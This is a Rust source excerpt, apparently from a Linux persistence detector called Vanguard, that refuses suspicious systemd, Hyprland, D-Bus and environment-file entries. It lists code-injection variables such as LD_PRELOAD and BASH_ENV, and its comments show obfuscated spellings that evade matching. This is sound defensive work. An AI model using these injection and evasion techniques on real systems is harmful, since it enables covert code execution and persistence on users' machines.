/// Le refus d'un lancement vu par le lot de détection de la persistance (`Ajout`), avec sa raison et où il est (`ou`
/// affichable, `numero` de sa première ligne ; un générateur, programme et non ligne, se montre par son seul chemin).
/// Un réglage d'unité nomme sa clé, lue dans la `ligne` (`cle_de_reglage`).
fn refus_ajoute(ajout: Ajout, ou: &str, numero: usize, ligne: &str) -> temoins::Refus {
    temoins::Refus(match ajout {
        Ajout::Jointe { .. } => trf!(
            "{ou}:{numero} : une ligne coupée par « \\ » en fin de ligne (ou par une fin de ligne que seul systemd voit) ne peut pas être déclarée normale : écrivez-la sur une seule ligne, ou retirez-la",
            "{ou}:{numero}: a line split by \"\\\" at the end of a line (or by a line ending only systemd sees) cannot be declared normal: write it on a single line, or remove it"
        ),
        Ajout::Session => trf!(
            "{ou}:{numero} : une unité du dossier de la session (XDG_RUNTIME_DIR/systemd) ne peut pas être déclarée normale : un programme du compte l'écrit et elle disparaît à l'arrêt ; retirez-la ou mettez-la dans ~/.config/systemd/user",
            "{ou}:{numero}: a unit in the session folder (XDG_RUNTIME_DIR/systemd) cannot be declared normal: a program of the account writes it and it vanishes at shutdown; remove it or put it in ~/.config/systemd/user"
        ),
        Ajout::Raccourci => trf!(
            "{ou}:{numero} : un raccourci de Hyprland qui lance une commande ne peut pas être déclaré normal : retirez la ligne, ou rangez le programme ailleurs que dans un dossier caché ou temporaire",
            "{ou}:{numero}: a Hyprland shortcut that starts a command cannot be declared normal: remove the line, or store the program outside a hidden or temporary folder"
        ),
        Ajout::LancementHypr => trf!(
            "{ou}:{numero} : un lancement de Hyprland précédé de règles (« [ … ] ») ne peut pas être déclaré normal : retirez la ligne ou ses règles",
            "{ou}:{numero}: a Hyprland launch preceded by rules (\"[ … ]\") cannot be declared normal: remove the line or its rules"
        ),
        Ajout::Generateur => trf!(
            "{ou} : un générateur de systemd ne peut pas être déclaré normal : retirez-le, ou rendez-le à root s'il vient d'un paquet",
            "{ou}: a systemd generator cannot be declared normal: remove it, or give it back to root if it comes from a package"
        ),
        Ajout::JointeHypr => trf!(
            "{ou}:{numero} : une ligne de Hyprland coupée par « \\ » en fin de ligne ne peut pas être déclarée normale : écrivez-la sur une seule ligne, ou retirez-la",
            "{ou}:{numero}: a Hyprland line split by \"\\\" at the end of a line cannot be declared normal: write it on a single line, or remove it"
        ),
        Ajout::CleHypr => trf!(
            "{ou}:{numero} : ce que lance ou charge cette ligne (greffon, commande d'hypridle, variable, appel Lua non lu) ne se lie pas à elle : elle ne peut pas être déclarée normale ; retirez-la, ou rangez le programme ailleurs que dans un dossier caché ou temporaire",
            "{ou}:{numero}: what this line starts or loads (plugin, hypridle command, variable, unread Lua call) is not bound to it: it cannot be declared normal; remove it, or store the program outside a hidden or temporary folder"
        ),
        Ajout::Reglage => {
            let cle = cle_de_reglage(ligne);
            trf!(
                "{ou}:{numero} : « {cle} » est un réglage d'unité qui change ce qui se lance (variable, bibliothèque préchargée, dossier de recherche des programmes, fichier de variables, dossier courant, entrée) ou qui n'est pas dans la liste de ce que Vanguard reconnaît comme sûr : il ne peut pas être déclaré normal ; retirez-le",
                "{ou}:{numero}: “{cle}” is a unit setting that changes what starts (variable, preloaded library, program search folder, variable file, working folder, input) or that is not in the list of what Vanguard recognises as safe: it cannot be declared normal; remove it"
            )
        }
        Ajout::Dossier => trf!(
            "{ou}:{numero} : une unité d'un dossier que systemd lit en plus des habituels (user.attached, XDG_DATA_DIRS, XDG_CONFIG_DIRS, dossier de session de systemd) ne peut pas être déclarée normale : retirez-la ou mettez-la dans ~/.config/systemd/user",
            "{ou}:{numero}: a unit in a folder systemd reads besides the usual ones (user.attached, XDG_DATA_DIRS, XDG_CONFIG_DIRS, systemd session folder) cannot be declared normal: remove it or put it in ~/.config/systemd/user"
        ),
        Ajout::DBus => trf!(
            "{ou}:{numero} : un service D-Bus de la session écrit par le compte ne peut pas être déclaré normal : il se lance dès qu'un programme demande son nom, à la place de celui du système ; retirez le fichier",
            "{ou}:{numero}: a session D-Bus service written by the account cannot be declared normal: it starts as soon as a program asks for its name, instead of the system one; remove the file"
        ),
        Ajout::Popt => trf!(
            "{ou}:{numero} : une ligne « exec » de popt fait lancer un autre programme à rsync (ou à tout programme qui lit ces réglages) quand il reçoit cette option : elle ne peut pas être déclarée normale ; retirez la ligne",
            "{ou}:{numero}: a popt “exec” line makes rsync (or any program that reads these settings) start another program when it gets this option: it cannot be declared normal; remove the line"
        ),
    })
}

/// Le refus d'une ligne qui n'est ni d'une unité de l'utilisateur ni un lancement de ~/.config/hypr (`ou` affichable).
fn hors_des_deux(ou: &str) -> temoins::Refus {
    temoins::Refus(trf!(
        "{ou} : seules une unité systemd de l'utilisateur et une ligne de lancement de ~/.config/hypr peuvent être déclarées normales : retirez ou déplacez cette ligne",
        "{ou}: only a systemd user unit and a launch line of ~/.config/hypr can be declared normal: remove or move this line"
    ))
}

/// Ce qui se lie de l'environnement des sessions : sous ce nom, chaque fichier qui pose des variables, en entier.
const ENVIRONNEMENT: &str = "[env] profils, environment.d, pam_env, systemd, Hyprland";

/// Au plus autant de fichiers lus en suivant leurs « source » (au-delà des fichiers connus) : une chaîne plus longue
/// ne se suit pas.
const SOURCES_MAX: usize = 64;

/// Au plus autant de lignes qui posent des variables hors de la liste sûre, montrées en clair dans le détail.
const VARIABLES_MONTREES: usize = 40;

/// Des variables qui font charger du code, mais que des paquets de base posent dans /etc/profile.d (AWKLIBPATH par
/// gawk, VSSCRIPT_PATH par vapoursynth) : refusées comme les autres, sauf dans un fichier que seul root peut changer
/// (`de_root_seul`), où un programme du compte ne les pose pas ; ce fichier reste lié en entier. Les refuser
/// partout rendrait chaque ligne non déclarable sur toute machine Arch (troisième vérification de la campagne E).
const DE_PAQUETS: [&str; 2] = ["AWKLIBPATH", "VSSCRIPT_PATH"];

/// Une variable de la famille « injection » : elle fait charger du code à un programme ou à un interpréteur
/// (bibliothèques, modules, options, fichier lu au démarrage d'un shell). Posée dans un fichier des variables, elle
/// rend chaque ligne non déclarable, au moment du choix comme après : le fichier qu'elle nomme n'est pas lié, et
/// changerait ce que fait la ligne acceptée (deuxième vérification de la campagne E, P1). Les variables qui ne font
/// que dire où chercher (PATH, HOME, XDG_*) ne sont pas de cette famille : leurs fichiers restent liés en entier
/// (limite écrite au modèle de menace).
fn variable_d_injection(nom: &str) -> bool {
    const DEBUTS: [&str; 9] = [
        "LD_",
        "BASH_FUNC_",
        "PYTHON",
        "PERL5",
        "GST_PLUGIN",
        "LUA_PATH",
        "LUA_CPATH",
        "LUA_INIT",
        "OPENSSL_",
    ];
    const NOMS: [&str; 46] = [
        "BASH_ENV",
        "ENV",
        "SHELLOPTS",
        "BASHOPTS",
        "PS4",
        "PERLLIB",
        "RUBYOPT",
        "RUBYLIB",
        "NODE_OPTIONS",
        "NODE_PATH",
        "GCONV_PATH",
        "GTK_MODULES",
        "GTK3_MODULES",
        "GTK_PATH",
        "GTK_EXE_PREFIX",
        "GTK_IM_MODULE_FILE",
        "GDK_PIXBUF_MODULE_FILE",
        "GDK_PIXBUF_MODULEDIR",
        "GIO_EXTRA_MODULES",
        "GIO_MODULE_DIR",
        "QT_PLUGIN_PATH",
        "QT_QPA_PLATFORM_PLUGIN_PATH",
        "QML_IMPORT_PATH",
        "QML2_IMPORT_PATH",
        "LIBGL_DRIVERS_PATH",
        "LIBVA_DRIVERS_PATH",
        "GBM_BACKENDS_PATH",
        "__EGL_VENDOR_LIBRARY_FILENAMES",
        "__EGL_VENDOR_LIBRARY_DIRS",
        "VK_ICD_FILENAMES",
        "VK_DRIVER_FILES",
        "VK_ADD_DRIVER_FILES",
        "VK_LAYER_PATH",
        "VK_ADD_LAYER_PATH",
        "JAVA_TOOL_OPTIONS",
        "_JAVA_OPTIONS",
        "JDK_JAVA_OPTIONS",
        "CLASSPATH",
        "TCLLIBPATH",
        // Le dossier d'où Omarchy charge sa bibliothèque Lua et ses scripts (bootstrap.lua, hyprland.lua).
        "OMARCHY_PATH",
        // Les dossiers où systemd prend ses unités et ses générateurs, à la place des habituels
        // (« ManagerEnvironment= » de user.conf les pose au gestionnaire du compte).
        "SYSTEMD_UNIT_PATH",
        "SYSTEMD_GENERATOR_PATH",
        "SYSTEMD_ENVIRONMENT_GENERATOR_PATH",
        // Vérification 3, P11 : une bibliothèque chargée par .NET, SDL ou Wine au démarrage d'un programme.
        "DOTNET_STARTUP_HOOKS",
        "SDL_DYNAMIC_API",
        "WINEDLLPATH",
    ];
    DEBUTS.iter().any(|d| nom.starts_with(d)) || NOMS.contains(&nom)
}

/// Une ligne telle qu'un lecteur la décode : échappements « \xHH », « \uHHHH », « \UHHHHHHHH », octal « \NNN »
/// décodés, toute autre barre oblique inverse retirée, guillemets retirés, « $ » d'un « $'…' » compris
/// (« L\D_PRELOAD », « "LD_"'PRELOAD' »,
/// « $'\x4c'D_PRELOAD », « \x4cD_PRELOAD » de systemd nomment tous LD_PRELOAD).
fn decodee(l: &str) -> String {
    let mut sortie = String::with_capacity(l.len());
    let mut cs = l.chars().peekable();
    while let Some(c) = cs.next() {
        match c {
            // « $'…' » et « $"…" » : des guillemets (ANSI-C, traduits), pas une lecture de variable.
            '$' if matches!(cs.peek(), Some('\'' | '"')) => {}
            '"' | '\'' => {}
            '\\' => {
                let (base, max) = match cs.peek() {
                    Some('x') => (16, 2),
                    Some('u') => (16, 4),
                    Some('U') => (16, 8),
                    Some('0'..='7') => (8, 3),
                    Some(_) => {
                        if let Some(suivant) = cs.next() {
                            sortie.push(suivant);
                        }
                        continue;
                    }
                    None => continue,
                };
                if base == 16 {
                    cs.next();
                }
                let mut valeur: u32 = 0;
                let mut lus: u32 = 0;
                while lus < max
                    && let Some(chiffre) = cs.peek().and_then(|x| x.to_digit(base))
                {
                    valeur = valeur.saturating_mul(base).saturating_add(chiffre);
                    cs.next();
                    lus = lus.saturating_add(1);
                }
                sortie.push(char::from_u32(valeur).unwrap_or('\u{fffd}'));
            }
            c => sortie.push(c),
        }
    }
    sortie
}

/// La première variable de la famille « injection » (`variable_d_injection`) qu'une ligne peut poser, après
/// décodage : tout mot qui la nomme, sauf une simple lecture (« $NOM », « ${NOM} », « ${#NOM} », « ${!NOM} ») ;
/// « ${NOM=…} » et « ${NOM:=…} » la posent, et comptent. Une lecture ne change rien à ce que lance la ligne
/// acceptée (bash-completion lit SHELLOPTS) ; tout le reste, même « unset » ou un mot qui n'en pose pas, est pris
/// dans le doute pour une écriture.
fn injection_nommee(l: &str, de_root: bool) -> Option<String> {
    let texte = decodee(l);
    let octets = texte.as_bytes();
    let mot = |b: u8| b.is_ascii_alphanumeric() || b == b'_';
    let mut i = 0usize;
    while i < octets.len() {
        if !octets.get(i).copied().is_some_and(mot) {
            i = i.saturating_add(1);
            continue;
        }
        let debut = i;
        while octets.get(i).copied().is_some_and(mot) {
            i = i.saturating_add(1);
        }
        let Some(nom) = texte.get(debut..i) else { continue };
        if !variable_d_injection(nom) && (de_root || !DE_PAQUETS.contains(&nom)) {
            continue;
        }
        let avant = |n: usize| debut.checked_sub(n).and_then(|k| octets.get(k).copied());
        let suite = texte.get(i..).unwrap_or_default();
        let accolade = avant(1) == Some(b'{') && avant(2) == Some(b'$')
            || matches!(avant(1), Some(b'#' | b'!')) && avant(2) == Some(b'{') && avant(3) == Some(b'$');
        let lecture = avant(1) == Some(b'$') || accolade && !(suite.starts_with('=') || suite.starts_with(":="));
        if !lecture {
            return Some(nom.to_string());
        }
    }
    None
}

/// La sorte d'un fichier des variables, qui dit comment il pose une variable pour la session. Elle vient toujours
/// du lieu où le fichier est trouvé (ou de celui qui le lit par « source »), jamais d'un morceau de son chemin
/// (relecture 0.95, X-1).
#[derive(Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Debug)]
enum Variables {
    /// Un profil ou un fichier qu'il lit : « export A=… », « declare -x », « setenv » (csh), « set -x » (fish).
    Shell,
    /// environment.d, /etc/environment, pam_env : « A=… », « A DEFAULT=… ».
    Cles,
    /// Les réglages du gestionnaire de systemd : DefaultEnvironment=, ManagerEnvironment=.
    Systemd,
    /// Hyprland : « env = A,… ».
    Hypr,
}

/// Les noms des variables qu'une ligne d'un fichier des variables de la sorte `sorte` pose pour la session, pour
/// les montrer (une affectation sans « export » dans un profil reste dans le shell, et ne se montre pas). Pour
/// l'affichage seulement : ce qui se lie est le fichier entier.
fn noms_poses(l: &str, sorte: Variables) -> Vec<String> {
    let identifiant = |m: &str| {
        let mut o = m.bytes();
        o.next().is_some_and(|p| p.is_ascii_alphabetic() || p == b'_')
            && o.all(|x| x.is_ascii_alphanumeric() || x == b'_')
    };
    let net = l.trim_matches([' ', '\t']);
    let mots: Vec<&str> = net.split([' ', '\t']).filter(|m| !m.is_empty()).collect();
    match sorte {
        Variables::Systemd => ["DefaultEnvironment=", "ManagerEnvironment="]
            .iter()
            .find_map(|c| net.strip_prefix(c))
            .map(|v| {
                v.split([' ', '\t'])
                    .filter_map(|m| m.trim_matches(['"', '\'']).split_once('=').map(|(n, _)| n.to_string()))
                    .collect()
            })
            .unwrap_or_default(),
        Variables::Hypr => net
            .strip_prefix("env")
            .map(|v| v.trim_start_matches([' ', '\t']))
            .and_then(|v| v.strip_prefix('='))
            .map(|v| v.split(',').next().unwrap_or_default().trim_matches([' ', '\t']))
            .filter(|n| identifiant(n))
            .map(|n| vec![n.to_string()])
            .unwrap_or_default(),
        Variables::Cles => match mots.first().copied() {
            Some(premier) => match premier.split_once('=') {
                Some((n, _)) if identifiant(n) => vec![n.to_string()],
                None if identifiant(premier)
                    && mots
                        .get(1)
                        .is_some_and(|m| m.starts_with("DEFAULT=") || m.starts_with("OVERRIDE=")) =>
                {
                    vec![premier.to_string()]
                }
                _ => Vec::new(),
            },
            None => Vec::new(),
        },
        Variables::Shell => match mots.first().copied() {
            Some("set") => {
                let exporte = mots
                    .iter()
                    .any(|m| *m == "--export" || (m.starts_with('-') && !m.starts_with("--") && m.contains('x')));
                match mots.iter().skip(1).find(|m| !m.starts_with('-')) {
                    Some(n) if exporte && identifiant(n) => vec![(*n).to_string()],
                    _ => Vec::new(),
                }
            }
            Some("setenv") => mots
                .get(1)
                .filter(|n| identifiant(n))
                .map(|n| vec![(*n).to_string()])
                .unwrap_or_default(),
            Some(c @ ("export" | "declare" | "typeset")) => {
                if c != "export" && !mots.iter().any(|m| m.starts_with('-') && m.contains('x')) {
                    return Vec::new();
                }
                mots.iter()
                    .skip(1)
                    .filter(|m| !m.starts_with('-'))
                    .map(|m| m.split('=').next().unwrap_or(m))
                    .filter(|n| identifiant(n))
                    .map(str::to_string)
                    .collect()
            }
            _ => Vec::new(),
        },
    }
}

/// L'environnement relevé (ou son refus), les fichiers de Hyprland lus par « source = », les « source = » non
/// suivis ou à dire (où, ligne, pourquoi), et les autres fichiers lus par une inclusion (« . », « source ») avec
/// leur sorte (R-6).
type Environnement = (
    Result<(String, temoins::Etat), temoins::Refus>,
    Vec<std::path::PathBuf>,
    Vec<(String, String, NonSuivi)>,
    Vec<(std::path::PathBuf, Variables)>,
);

/// Pourquoi un « source = » de Hyprland se dit (deuxième vérification, N2, N3).
#[derive(Clone, Copy, PartialEq, Eq)]
enum NonSuivi {
    /// Son chemin se calcule (variable, guillemets) : non suivi.
    Calcule,
    /// Un joker dans la partie dossier du chemin : non suivi.
    Joker,
    /// Le fichier inclus est dans un dossier temporaire : suivi, et dit.
    Temporaire,
    /// Au-delà de `SOURCES_MAX` inclusions, ce nombre de fichiers de Hyprland ne sont pas lus.
    Borne(usize),
}

/// Les fichiers qui posent des variables pour les sessions et les services de l'utilisateur : les profils (`profils`),
/// Hyprland (`hypr`), environment.d, les réglages du gestionnaire de systemd (DefaultEnvironment=), pam_env, et
/// chaque fichier qu'ils lisent par un « source » écrit en toutes lettres, à tous les niveaux. Chacun est lié par
/// l'empreinte de son contenu entier : une variable posée là après le choix change ce que fait la ligne acceptée sans
/// toucher à un fichier lié ; liée ainsi, elle fait revenir l'alerte (campagne E, F4 ; vérification, N3). Refusé :
/// une variable de la famille « injection » nommée dans l'un d'eux (`variable_d_injection`, après décodage), dont le
/// fichier ne serait pas lié (deuxième vérification, P1). Le détail montre une ligne par sorte de chose liée : les
/// fichiers, les « source » non suivis, les lignes qui posent une variable hors de la liste sûre, en clair (pas une
/// empreinte par fichier : illisible pour un proche). `Err` : un de ces fichiers ne se lit pas en entier, ou un
/// « source » de Hyprland ne dit pas ce qu'il lit.
fn environnement(
    r: &Releveur,
    profils: Vec<(std::path::PathBuf, Variables)>,
    hypr: Vec<std::path::PathBuf>,
) -> Environnement {
    let s = |c: &str| r.sous(Path::new(c));
    let m = |c: &str| r.maison.join(c);
    let mut connus = profils;
    for (f, sorte) in [
        ("/etc/systemd/user.conf", Variables::Systemd),
        ("/etc/systemd/system.conf", Variables::Systemd),
        ("/etc/security/pam_env.conf", Variables::Cles),
    ] {
        connus.push((s(f), sorte));
    }
    for (d, sorte) in [
        ("/etc/systemd/user.conf.d", Variables::Systemd),
        ("/etc/systemd/system.conf.d", Variables::Systemd),
        ("/usr/lib/environment.d", Variables::Cles),
        ("/run/environment.d", Variables::Cles),
    ] {
        connus.extend(fichiers_de(&s(d), &["conf"]).into_iter().map(|f| (f, sorte)));
    }
    connus.push((m(".config/systemd/user.conf"), Variables::Systemd));
    connus.push((m(".pam_environment"), Variables::Cles));
    connus.extend(
        fichiers_de(&m(".config/systemd/user.conf.d"), &["conf"])
            .into_iter()
            .map(|f| (f, Variables::Systemd)),
    );
    if let Some(c) = &r.config {
        connus.push((r.sous(&c.join("systemd/user.conf")), Variables::Systemd));
        for (d, sorte) in [
            ("systemd/user.conf.d", Variables::Systemd),
            ("environment.d", Variables::Cles),
        ] {
            connus.extend(
                fichiers_de(&r.sous(&c.join(d)), &["conf"])
                    .into_iter()
                    .map(|f| (f, sorte)),
            );
        }
    }
    // Chaque fichier et sa sorte, qui vient du lieu où il est trouvé : un fichier de Hyprland, celui qui le lit par
    // « source = » le dit, pas son chemin (deuxième vérification de la campagne E, puis X-1).
    let mut sources: Vec<(std::path::PathBuf, Variables)> = connus;
    sources.extend(hypr.into_iter().map(|f| (f, Variables::Hypr)));
    sources.sort();
    sources.dedup();
    let connus = sources.len();
    let mut lus: Vec<(String, String)> = Vec::new();
    let mut hypr_lus: Vec<std::path::PathBuf> = Vec::new();
    let mut inclus: Vec<(std::path::PathBuf, Variables)> = Vec::new();
    let mut hypr_non_suivies: Vec<(String, String, NonSuivi)> = Vec::new();
    let mut non_suivies: Vec<String> = Vec::new();
    let mut posees: Vec<String> = Vec::new();
    // Le premier refus l'emporte, mais la lecture continue : les fichiers de Hyprland qu'elle trouve se jugent
    // ensuite (leurs lancements), refus ou non.
    let mut refus: Option<temoins::Refus> = None;
    let mut rang = 0usize;
    while let Some((f, variables)) = sources.get(rang).cloned() {
        let est_hypr = variables == Variables::Hypr;
        rang = rang.saturating_add(1);
        if rang > connus.saturating_add(SOURCES_MAX) {
            refus.get_or_insert(temoins::Refus(trf!(
                "les fichiers des variables des sessions en lisent plus de {SOURCES_MAX} autres : la chaîne ne se suit pas",
                "the session variable files read more than {SOURCES_MAX} others: the chain cannot be followed"
            )));
            // Les fichiers de Hyprland coupés par la borne lanceraient sans être lus : dits, jamais tus (deuxième
            // vérification, N2).
            let coupes = sources
                .get(rang.saturating_sub(1)..)
                .unwrap_or_default()
                .iter()
                .filter(|(_, h)| *h == Variables::Hypr)
                .count();
            if coupes > 0 {
                let premier = sources
                    .get(rang.saturating_sub(1)..)
                    .unwrap_or_default()
                    .iter()
                    .find(|(_, h)| *h == Variables::Hypr)
                    .map(|(c, _)| r.montre(c))
                    .unwrap_or_default();
                hypr_non_suivies.push((premier.clone(), premier, NonSuivi::Borne(coupes)));
            }
            break;
        }
        let montre = crate::ui::affichable(&r.montre(&f));
        let lu = match temoins::lire_borne(&f, LECTURE_MAX) {
            Ok(lu) => lu,
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => continue,
            Err(e) => {
                refus.get_or_insert(temoins::Refus(trf!(
                    "{montre} ne se lit pas ({e}) : les variables qu'il pose pour les sessions ne se vérifient pas",
                    "{montre} cannot be read ({e}): the variables it sets for sessions cannot be checked"
                )));
                continue;
            }
        };
        if !lu.entier {
            refus.get_or_insert(temoins::Refus(trf!(
                "{montre} ne se lit pas en entier",
                "{montre} cannot be read in full"
            )));
            continue;
        }
        let (Ok(texte), Some(_)) = (std::str::from_utf8(&lu.octets), f.to_str()) else {
            refus.get_or_insert(octet_refuse(&montre));
            continue;
        };
        if lus.iter().any(|(c, _)| *c == r.montre(&f)) {
            continue;
        }
        lus.push((r.montre(&f), temoins::sha256_de(&lu.octets)));
        if est_hypr {
            hypr_lus.push(f.clone());
        } else if rang > connus {
            // R-6 (re-contrôle 0.95) : un fichier lu par l'inclusion d'un autre (un profil, un fichier d'uwsm) pose
            // et lance comme lui : il se juge aussi, pas seulement son empreinte.
            inclus.push((f.clone(), variables));
        }
        let de_root = de_root_seul(&f);
        let injection = |numero: usize, nom: &str| {
            temoins::Refus(trf!(
                "{montre}:{numero} nomme {}, une variable qui fait charger du code à un programme : le fichier qu'elle désigne n'est pas lié",
                "{montre}:{numero} names {}, a variable that makes a program load code: the file it designates is not bound",
                crate::ui::affichable(nom)
            ))
        };
        // Au format de systemd, un retour chariot seul coupe aussi l'enregistrement (L-1) : chaque morceau se juge, à
        // la ligne écrite qui le porte.
        let systemd = format_systemd(variables);
        for (numero, physiques, jointe) in lignes_continuees(texte) {
            let mut vus: Vec<String> = Vec::new();
            for (n, l) in physiques
                .iter()
                .flat_map(|(n, l)| enregistrements(l, systemd).into_iter().map(move |e| (n, e)))
            {
                // Un commentaire (« # » en tête, partout dans ces formats) ne pose rien ; sauf s'il finit par « \ » :
                // une ligne continuée selon le lecteur, gardée.
                let net = l.trim_matches([' ', '\t']);
                if net.starts_with('#') && !net.ends_with('\\') {
                    continue;
                }
                if let Some(nom) = injection_nommee(l, de_root) {
                    refus.get_or_insert(injection(*n, &nom));
                }
                let noms = noms_poses(l, variables);
                if noms.iter().any(|nom| !variable_permise(nom)) {
                    posees.push(format!(
                        "{montre}:{n} : {}",
                        crate::ui::couper(&crate::ui::affichable(net), 90)
                    ));
                }
                vus.extend(noms);
            }
            // Le shell et environment.d joignent « \ » + retour à la ligne suivante sans rien entre les deux : un nom
            // coupé ainsi (« export L\⏎D_PRELOAD=… ») ne se voit que joint (troisième vérification, V1). systemd met
            // une espace : ses mots sont ceux des lignes une à une, déjà lues.
            if physiques.len() > 1 {
                for jointe in enregistrements(&jointe, systemd) {
                    if let Some(nom) = injection_nommee(jointe, de_root) {
                        refus.get_or_insert(injection(numero, &nom));
                    }
                    let noms = noms_poses(jointe, variables);
                    if noms.iter().any(|nom| !variable_permise(nom) && !vus.contains(nom)) {
                        posees.push(format!(
                            "{montre}:{numero} : {}",
                            crate::ui::couper(&crate::ui::affichable(jointe.trim_matches([' ', '\t'])), 90)
                        ));
                    }
                }
            }
        }
        // Les « source » lus ligne à ligne, et dans le texte aux lignes continuées jointes (« . \⏎~/x ») : le
        // lecteur fait l'un ou l'autre, les deux se suivent.
        let joint = texte_joint(texte);
        let mut suivis = Vec::new();
        for t in [texte, joint.as_str()] {
            let trouvees = sources_lues(r, &f, t, est_hypr, &montre);
            if let Some(x) = trouvees.refus {
                refus.get_or_insert(x);
            }
            suivis.extend(trouvees.suivis);
            if !de_root {
                for (n, ligne, pourquoi) in trouvees.hypr_non_suivies {
                    let dit = (format!("{montre}:{n}"), ligne, pourquoi);
                    if !hypr_non_suivies.contains(&dit) {
                        hypr_non_suivies.push(dit);
                    }
                }
            }
            for n in trouvees.non_suivies {
                let dit = format!("{montre}:{n}");
                if !non_suivies.contains(&dit) {
                    non_suivies.push(dit);
                }
            }
        }
        for suivi in suivis {
            if !sources.iter().any(|(c, _)| *c == suivi) {
                // Lu par « source » : un fichier de Hyprland s'il l'est par Hyprland, un script sinon.
                let sorte = if est_hypr { Variables::Hypr } else { Variables::Shell };
                sources.push((suivi, sorte));
            }
        }
    }
    if let Some(x) = refus {
        return (Err(x), hypr_lus, hypr_non_suivies, inclus);
    }
    lus.sort();
    // Ce qui se lie : chaque fichier et l'empreinte de son contenu entier, sans langue (un choix fait en anglais vaut
    // en français). Ce qui se montre : quelques lignes lisibles, hors de l'empreinte.
    let mut lie = String::new();
    for (chemin, etat) in &lus {
        lie.push_str(chemin);
        lie.push_str(" : ");
        lie.push_str(etat);
        lie.push('\n');
    }
    let mut montre = vec![trf!(
        "{} fichiers de variables liés en entier : {}",
        "{} variable files bound in full: {}",
        lus.len(),
        lus.iter()
            .map(|(c, _)| crate::ui::affichable(c))
            .collect::<Vec<_>>()
            .join(", ")
    )];
    if !non_suivies.is_empty() {
        montre.push(trf!(
            "« source » non suivis (chemin calculé ou relatif ; le fichier qui l'écrit reste lié) : {}",
            "“source” not followed (computed or relative path; the file that writes it stays bound): {}",
            non_suivies.join(", ")
        ));
    }
    if !posees.is_empty() {
        montre.push(trf!(
            "{} lignes posent une variable hors de la liste sûre (écran, langue, fuseau, terminal) :",
            "{} lines set a variable outside the safe list (display, language, time zone, terminal):",
            posees.len()
        ));
        let reste = posees.len().saturating_sub(VARIABLES_MONTREES);
        montre.extend(posees.into_iter().take(VARIABLES_MONTREES));
        if reste > 0 {
            montre.push(trf!("… et {reste} autres", "… and {reste} more"));
        }
    }
    (
        Ok((
            ENVIRONNEMENT.to_string(),
            temoins::Etat::lie_et_montre(lie.as_bytes(), montre),
        )),
        hypr_lus,
        hypr_non_suivies,
        inclus,
    )
}

/// Une ligne logique : le numéro de sa première ligne, chaque ligne physique et son numéro, le texte joint.
type LigneContinuee<'a> = (usize, Vec<(usize, &'a str)>, String);

/// Les lignes logiques d'un fichier des variables, comme les joint un shell : (numéro de la première ligne, chaque
/// ligne physique et son numéro, le texte joint sans rien à la place de « \ » + retour). Une ligne qui finit par
/// « \ » (blancs de fin compris : dans le doute, jointe) se continue sur la suivante.
fn lignes_continuees(texte: &str) -> Vec<LigneContinuee<'_>> {
    lignes_jointes(texte, None)
}

/// `lignes_continuees` comme les lit un shell pour les juger : un commentaire qui commence une ligne logique s'arrête
/// à sa fin de ligne, « \ » compris. Une ligne de préchargement écrite après « # … \ » se voit donc seule. Le
/// commentaire selon le lecteur du fichier (`commentaire_selon`, R-3) : « -- ; export LD_PRE\⏎LOAD=… » se joint.
fn lignes_du_shell(texte: &str, sorte: Variables) -> Vec<LigneContinuee<'_>> {
    lignes_jointes(texte, Some(sorte))
}

fn lignes_jointes(texte: &str, commentaire_seul: Option<Variables>) -> Vec<LigneContinuee<'_>> {
    let mut sortie = Vec::new();
    let mut physiques: Vec<(usize, &str)> = Vec::new();
    let mut jointe = String::new();
    for (n, l) in texte.lines().enumerate() {
        let debut_de_ligne = physiques.is_empty();
        physiques.push((n.saturating_add(1), l));
        let continuee = !(debut_de_ligne && commentaire_seul.is_some_and(|s| commentaire_selon(l, s)));
        if continuee && let Some(debut) = l.trim_end_matches([' ', '\t', '\r']).strip_suffix('\\') {
            jointe.push_str(debut);
        } else {
            jointe.push_str(l);
            let premiere = physiques.first().map_or(1, |(n, _)| *n);
            sortie.push((premiere, std::mem::take(&mut physiques), std::mem::take(&mut jointe)));
        }
    }
    if let Some((premiere, _)) = physiques.first().copied() {
        sortie.push((premiere, physiques, jointe));
    }
    sortie
}

/// Le texte aux lignes continuées jointes, chacune à la place de sa première ligne, suivie d'autant de lignes vides
/// qu'elle en joignait : les numéros des lignes restent ceux du fichier.
fn texte_joint(texte: &str) -> String {
    let mut sortie = String::with_capacity(texte.len());
    for (_, physiques, jointe) in lignes_continuees(texte) {
        sortie.push_str(&jointe);
        sortie.push('\n');
        for _ in 1..physiques.len() {
            sortie.push('\n');
        }
    }
    sortie
}

/// Un fichier que seul root peut changer : chaque entrée que la lecture de `f` traverse (`chemin_tenu`) appartient à
/// root, et chaque dossier et le fichier lui-même sont sans écriture pour le groupe ni les autres. Un programme du
/// compte, sans root, n'y pose rien, ni ne change où mène un lien du chemin. Dans un espace de noms d'utilisateurs
/// (« unshare -r »), le propriétaire 0 vu peut être le compte lui-même : rien n'y est « de root seul ».
///
/// V-2 (relecture du lot c2-uwsm, 0.95) : avant, seul le chemin réel (`canonicalize`) se jugeait. Un lien que le
/// compte pose dans son dossier (/var/tmp/x/uwsm/env vers un fichier de /usr) passait pour à root seul : le compte
/// choisissait quel fichier de root uwsm lit comme un script. Le dossier de chaque lien du milieu (W-7) compte aussi.
fn de_root_seul(f: &Path) -> bool {
    use std::os::unix::fs::MetadataExt as _;
    let carte = std::fs::read_to_string("/proc/self/uid_map").unwrap_or_default();
    if !uid_sans_traduction(&carte) {
        return false;
    }
    // Un lien n'a pas de droits à lui (toujours 0777) et ne se change pas : il se remplace, par qui écrit dans son
    // dossier, jugé comme toute autre entrée.
    chemin_tenu(f, &|_, m| {
        m.uid() == 0 && (m.file_type().is_symlink() || m.mode() & 0o022 == 0)
    })
}

/// Au plus autant de liens suivis pour un chemin, la limite du noyau (MAXSYMLINKS).
const LIENS_SUIVIS_MAX: usize = 40;

/// `tenue` est vraie de chaque entrée que le noyau traverse pour ouvrir `f`, dans l'ordre où il la traverse : « / »,
/// chaque entrée du chemin tel que nommé, chaque lien (lui-même, sans le suivre) puis chaque entrée de sa cible, « .. »
/// défait sur le dossier déjà atteint (comme le noyau, pas sur le texte), jusqu'au fichier final. Faux au premier
/// refus, et sur ce qui ne se juge pas : un chemin relatif, une entrée qui ne se lit pas, un lien qui ne se lit pas,
/// plus de `LIENS_SUIVIS_MAX` liens. Jamais « tenu » par défaut.
fn chemin_tenu(f: &Path, tenue: &dyn Fn(&Path, &std::fs::Metadata) -> bool) -> bool {
